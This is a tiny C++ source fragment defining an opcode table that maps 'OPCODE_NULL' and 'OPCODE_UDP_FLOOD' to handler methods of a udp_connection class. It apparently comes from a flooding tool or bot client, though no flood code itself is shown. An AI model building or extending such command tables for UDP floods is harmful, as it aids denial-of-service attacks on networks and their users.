#include "opcode.h"
#include "udp_connection.h"

OpcodeHandler OpcodeTable[2] =
{
    { "OPCODE_NULL",        &udp_connection::HandleOpcodeNull },
    { "OPCODE_UDP_FLOOD",   &udp_connection::HandleOpcodeUdpFlood }
};
